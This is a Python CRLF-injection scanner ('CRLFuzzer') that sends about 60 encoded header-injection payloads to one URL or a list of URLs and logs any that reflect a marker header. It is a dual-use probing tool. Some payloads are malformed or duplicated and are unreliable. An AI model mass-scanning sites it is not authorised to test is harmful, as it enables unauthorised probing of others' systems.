#!/usr/bin/python3
import requests, urllib3, os, argparse, re
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Warna untuk output
reset = Fore.RESET
red = Fore.RED
cyan = Fore.CYAN
green = Fore.GREEN
yellow = Fore.YELLOW
white = Fore.WHITE


def main():
    print(f"""{cyan}
 ▄████▄   ██▀███   ██▓      █████▒█    ██ ▒███████▒▒███████▒▓█████  ██▀███  
▒██▀ ▀█  ▓██ ▒ ██▒▓██▒    ▓██   ▒ ██  ▓██▒▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██░    ▒████ ░▓██  ▒██░░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██░    ░▓█▒  ░▓▓█  ░██░  ▄▀▒   ░  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  
▒ ▓███▀ ░░██▓ ▒██▒░██████▒░▒█░   ▒▒█████▓ ▒███████▒▒███████▒░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▓  ░ ▒ ░   ░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒     ░▒ ░ ▒░░ ░ ▒  ░ ░     ░░▒░ ░ ░ ░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░
░          ░░   ░   ░ ░    ░ ░    ░░░ ░ ░ ░ ░ ░ ░ ░░ ░ ░ ░ ░   ░     ░░   ░ 
░ ░         ░         ░  ░          ░       ░ ░      ░ ░       ░  ░   ░     
░                                         ░        ░                        

{white} V 1.1
{white} by randiXploit
{reset}""")
    
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    
    group.add_argument("-u", "--url", help="target", metavar="<URL>")
    group.add_argument("-l", "--list", help="file", metavar="<FILE>")
    args = parser.parse_args()
    
    
    if args.url:
        target = args.url
        
        output_file = "vuln_crlf.txt"
        
        if os.path.isfile(output_file):
            with open(output_file, "r") as f:
                existing_urls = set(line.strip() for line in f)
        else:
            existing_urls = set()
        
            
        print(f"[{cyan}INFO{reset}] Single Scanning CRLF Vulnerability From {target}")
        
        payloads = [
            "/%0ATest-CRLF:crlf=Just_R",
            "/%0A%20Test-CRLF:crlf=Just_R",
            "/%20%0ATest-CRLF:crlf=Just_R",
            "/%23%OATest-CRLF:crlf=Just_R",
            "/%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
            "/%E5%98%8A%E5%98%8D%0ATest-CRLF:crlf=Just_R",
            "/%3F%0ATest-CRLF:crlf=Just_R",
            "/crlf%0ATest-CRLF:crlf=Just_R",
            "/crlf%0A%20Test-CRLF:crlf=Just_R",
            "/crlf%20%0ATest-CRLF:crlf=Just_R",
            "/crlf%23%OATest-CRLF:crlf=Just_R",
            "/crlf%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
            "/crlf%E5%98%8A%E5%98%8D%0ATest-CRLF:crlf=Just_R",
            "/crlf%3F%0ATest-CRLF:crlf=Just_R",
            "/%0DTest-CRLF:crlf=Just_R",
            "/%0D%20Test-CRLF:crlf=Just_R",
            "/%20%0DTest-CRLF:crlf=Just_R",
            "/%23%0DTest-CRLF:crlf=Just_R",
            "/%23%0ATest-CRLF:crlf=Just_R",
            "/%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
            "/%E5%98%8A%E5%98%8D%0DTest-CRLF:crlf=Just_R",
            "/%3F%0DTest-CRLF:crlf=Just_R",
            "/crlf%0DTest-CRLF:crlf=Just_R",
            "/crlf%0D%20Test-CRLF:crlf=Just_R",
            "/crlf%20%0DTest-CRLF:crlf=Just_R",
            "/crlf%23%0DTest-CRLF:crlf=Just_R",
            "/crlf%23%0ATest-CRLF:crlf=Just_R",
            "/crlf%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
            "/crlf%E5%98%8A%E5%98%8D%0DTest-CRLF:crlf=Just_R",
            "/crlf%3F%0DTest-CRLF:crlf=Just_R",
            "/%0D%0ATest-CRLF:crlf=Just_R",
            "/%0D%0A%20Test-CRLF:crlf=Just_R",
            "/%20%0D%0ATest-CRLF:crlf=Just_R",
            "/%23%0D%0ATest-CRLF:crlf=Just_R",
            "/\\r\\nTest-CRLF:crlf=Just_R",
            "/ \\r\\n Test-CRLF:crlf=Just_R",
            "/\\r\\n Test-CRLF:crlf=Just_R",
            "/%5cr%5cnTest-CRLF:crlf=Just_R",
            "/%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
            "/%E5%98%8A%E5%98%8D%0D%0ATest-CRLF:crlf=Just_R",
            "/%3F%0D%0ATest-CRLF:crlf=Just_R",
            "/crlf%0D%0ATest-CRLF:crlf=Just_R",
            "/crlf%0D%0A%20Test-CRLF:crlf=Just_R",
            "/crlf%20%0D%0ATest-CRLF:crlf=Just_R",
            "/crlf%23%0D%0ATest-CRLF:crlf=Just_R",
            "/crlf\\r\\nTest-CRLF:crlf=Just_R",
            "/crlf%5cr%5cnTest-CRLF:crlf=Just_R",
            "/crlf%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
            "/crlf%E5%98%8A%E5%98%8D%0D%0ATest-CRLF:crlf=Just_R",
            "/crlf%3F%0D%0ATest-CRLF:crlf=Just_R",
            "/%0D%0A%09Test-CRLF:crlf=Just_R",
            "/crlf%0D%0A%09Test-CRLF:crlf=Just_R",
            "/%250ATest-CRLF:crlf=Just_R",
            "/%25250ATest-CRLF:crlf=Just_R",
            "/%%0A0ATest-CRLF:crlf=Just_R",
            "/%25%30ATest-CRLF:crlf=Just_R",
            "/%25%30%61Test-CRLF:crlf=Just_R",
            "/%u000ATest-CRLF:crlf=Just_R",
            "//www.google.com/%2F%2E%2E%0D%0ATest-CRLF:crlf=Just_R",
            "/www.google.com/%2E%2E%2F%0D%0ATest-CRLF:crlf=Just_R",
            "/google.com/%2F..%0D%0ATest-CRLF:crlf=Just_R"
        ]
          
    
        def scan_url(payload):
            try:
                full_url = f"{target}{payload}"
                
                # Mengirim request original
                original_response = requests.get(target, verify=False, timeout=10, allow_redirects=False, headers={
                    "User-Agent": "Mozilla/5.0 (Linux; Android 14; Infinix X6833B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip",
                    "Connection": "close",
                })
    
                # Response dengan payload injeksi CRLF
                injected_response = requests.get(full_url,verify=False, timeout=10, allow_redirects=False, headers={
                    "User-Agent": "Mozilla/5.0 (Linux; Android 14; Infinix X6833B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip",
                    "Connection": "close",
                })
    
                original_headers = original_response.headers
                injected_headers = injected_response.headers
    
                # Cek apakah header CRLF berhasil disuntikkan
                
                if "Test-CRLF" in injected_headers and "crlf=Just_R" in injected_headers["Test-CRLF"]:
                    if "Test-CRLF" not in original_headers:
                        if full_url not in existing_urls:
                            with open(output_file, "a") as output:
                                output.write(f"{full_url}\n")
                            print(f"[{green}VULN{reset}] {full_url}")
                        else:
                            print(f"[{green}VULN{reset}] {full_url} Already saved.")
                    else:
                        print(f"[{red}NO VULN{reset}] {full_url}")
                else:
                    print(f"[{red}NO VULN{reset}] {full_url}")
                
                
            except requests.exceptions.TooManyRedirects:
                print(f"[{red}ERROR{reset}] Too many redirects for {full_url}!")
            except requests.exceptions.ConnectionError:
                print(f"[{red}ERROR{reset}] Connection aborted for {full_url}!")
            except requests.exceptions.ReadTimeout:
                print(f"[{red}ERROR{reset}] Connection timeout for {full_url}!")
            except requests.exceptions.InvalidSchema:
                print(f"[{red}ERROR{reset}] Invalid schema for {full_url}!")
            except requests.exceptions.MissingSchema:
                print(f"[{red}ERROR{reset}] Missing schema (https://) for {full_url}!")
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [
                executor.submit(scan_url, payload)
                for payload in payloads
            ]
            for future in as_completed(futures):
                pass
        print(f"[{cyan}INFO{reset}] The output is saved in {output_file}")
            
    
    if args.list:
        target = args.list
    
        output_file = "vuln_crlf.txt"
    
        # Memuat existing URLs sekali di awal dari file
        if os.path.isfile(output_file):
            with open(output_file, "r") as f:
                existing_urls = set(line.strip() for line in f)
        else:
            existing_urls = set()
    
        if os.path.isfile(target):
            try:
                print(f"[{cyan}INFO{reset}] Mass Scanning CRLF Vulnerability From {target}")
                with open(target, "r") as file:
                    urls = [line.strip() for line in file]
                
                payloads = [
                    "/%0ATest-CRLF:crlf=Just_R",
                    "/%0A%20Test-CRLF:crlf=Just_R",
                    "/%20%0ATest-CRLF:crlf=Just_R",
                    "/%23%OATest-CRLF:crlf=Just_R",
                    "/%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
                    "/%E5%98%8A%E5%98%8D%0ATest-CRLF:crlf=Just_R",
                    "/%3F%0ATest-CRLF:crlf=Just_R",
                    "/crlf%0ATest-CRLF:crlf=Just_R",
                    "/crlf%0A%20Test-CRLF:crlf=Just_R",
                    "/crlf%20%0ATest-CRLF:crlf=Just_R",
                    "/crlf%23%OATest-CRLF:crlf=Just_R",
                    "/crlf%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
                    "/crlf%E5%98%8A%E5%98%8D%0ATest-CRLF:crlf=Just_R",
                    "/crlf%3F%0ATest-CRLF:crlf=Just_R",
                    "/%0DTest-CRLF:crlf=Just_R",
                    "/%0D%20Test-CRLF:crlf=Just_R",
                    "/%20%0DTest-CRLF:crlf=Just_R",
                    "/%23%0DTest-CRLF:crlf=Just_R",
                    "/%23%0ATest-CRLF:crlf=Just_R",
                    "/%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
                    "/%E5%98%8A%E5%98%8D%0DTest-CRLF:crlf=Just_R",
                    "/%3F%0DTest-CRLF:crlf=Just_R",
                    "/crlf%0DTest-CRLF:crlf=Just_R",
                    "/crlf%0D%20Test-CRLF:crlf=Just_R",
                    "/crlf%20%0DTest-CRLF:crlf=Just_R",
                    "/crlf%23%0DTest-CRLF:crlf=Just_R",
                    "/crlf%23%0ATest-CRLF:crlf=Just_R",
                    "/crlf%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
                    "/crlf%E5%98%8A%E5%98%8D%0DTest-CRLF:crlf=Just_R",
                    "/crlf%3F%0DTest-CRLF:crlf=Just_R",
                    "/%0D%0ATest-CRLF:crlf=Just_R",
                    "/%0D%0A%20Test-CRLF:crlf=Just_R",
                    "/%20%0D%0ATest-CRLF:crlf=Just_R",
                    "/%23%0D%0ATest-CRLF:crlf=Just_R",
                    "/\\r\\nTest-CRLF:crlf=Just_R",
                    "/ \\r\\n Test-CRLF:crlf=Just_R",
                    "/\\r\\n Test-CRLF:crlf=Just_R",
                    "/%5cr%5cnTest-CRLF:crlf=Just_R",
                    "/%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
                    "/%E5%98%8A%E5%98%8D%0D%0ATest-CRLF:crlf=Just_R",
                    "/%3F%0D%0ATest-CRLF:crlf=Just_R",
                    "/crlf%0D%0ATest-CRLF:crlf=Just_R",
                    "/crlf%0D%0A%20Test-CRLF:crlf=Just_R",
                    "/crlf%20%0D%0ATest-CRLF:crlf=Just_R",
                    "/crlf%23%0D%0ATest-CRLF:crlf=Just_R",
                    "/crlf\\r\\nTest-CRLF:crlf=Just_R",
                    "/crlf%5cr%5cnTest-CRLF:crlf=Just_R",
                    "/crlf%E5%98%8A%E5%98%8DTest-CRLF:crlf=Just_R",
                    "/crlf%E5%98%8A%E5%98%8D%0D%0ATest-CRLF:crlf=Just_R",
                    "/crlf%3F%0D%0ATest-CRLF:crlf=Just_R",
                    "/%0D%0A%09Test-CRLF:crlf=Just_R",
                    "/crlf%0D%0A%09Test-CRLF:crlf=Just_R",
                    "/%250ATest-CRLF:crlf=Just_R",
                    "/%25250ATest-CRLF:crlf=Just_R",
                    "/%%0A0ATest-CRLF:crlf=Just_R",
                    "/%25%30ATest-CRLF:crlf=Just_R",
                    "/%25%30%61Test-CRLF:crlf=Just_R",
                    "/%u000ATest-CRLF:crlf=Just_R",
                    "//www.google.com/%2F%2E%2E%0D%0ATest-CRLF:crlf=Just_R",
                    "/www.google.com/%2E%2E%2F%0D%0ATest-CRLF:crlf=Just_R",
                    "/google.com/%2F..%0D%0ATest-CRLF:crlf=Just_R"
                ]
                
                def scan_url(url, payload):
                    try:
                        full_url = f"{url}{payload}"
                        
                        # Mengirim request original
                        original_response = requests.get(url, verify=False, timeout=10, allow_redirects=False, headers={
                            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Infinix X6833B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip",
                            "Connection": "close",
                        })
    
                        # Response dengan payload injeksi CRLF
                        injected_response = requests.get(full_url, verify=False, timeout=10, allow_redirects=False, headers={
                            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Infinix X6833B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Accept-Encoding": "gzip",
                            "Connection": "close",
                        })
    
                        original_headers = original_response.headers
                        injected_headers = injected_response.headers
    
                        # Cek apakah header CRLF berhasil disuntikkan
                        if "Test-CRLF" in injected_headers and "crlf=Just_R" in injected_headers["Test-CRLF"]:
                            if "Test-CRLF" not in original_headers:
                                if full_url not in existing_urls:
                                    with open(output_file, "a") as output:
                                        output.write(f"{full_url}\n")
                                    print(f"[{green}VULN{reset}] {full_url}")
                                else:
                                    print(f"[{green}VULN{reset}] {full_url} Already saved.")
                            else:
                                print(f"[{red}NOT VULN{reset}] {full_url}")
                        else:
                            print(f"[{red}NOT VULN{reset}] {full_url}")
                    except requests.exceptions.TooManyRedirects:
                        print(f"[{red}ERROR{reset}] Too many redirects for {full_url}!")
                    except requests.exceptions.ConnectionError:
                        print(f"[{red}ERROR{reset}] Connection aborted for {full_url}!")
                    except requests.exceptions.ReadTimeout:
                        print(f"[{red}ERROR{reset}] Connection timeout for {full_url}!")
                    except requests.exceptions.InvalidSchema:
                        print(f"[{red}ERROR{reset}] Invalid schema for {full_url}!")
                    except requests.exceptions.MissingSchema:
                        print(f"[{red}ERROR{reset}] Missing schema (https://) for {full_url}!")
    
                with ThreadPoolExecutor(max_workers=20) as executor:
                    futures = [
                        executor.submit(scan_url, url, payload)
                        for url in urls for payload in payloads
                    ]
    
                    # Tunggu semua future selesai
                    for future in as_completed(futures):
                        pass
    
                print(f"[{cyan}INFO{reset}] The output is saved in {output_file}")
            except FileNotFoundError:
                print(f"[{red}ERROR{reset}] File {target} not found.")
                
                
    
if __name__ == "__main__":
    main()
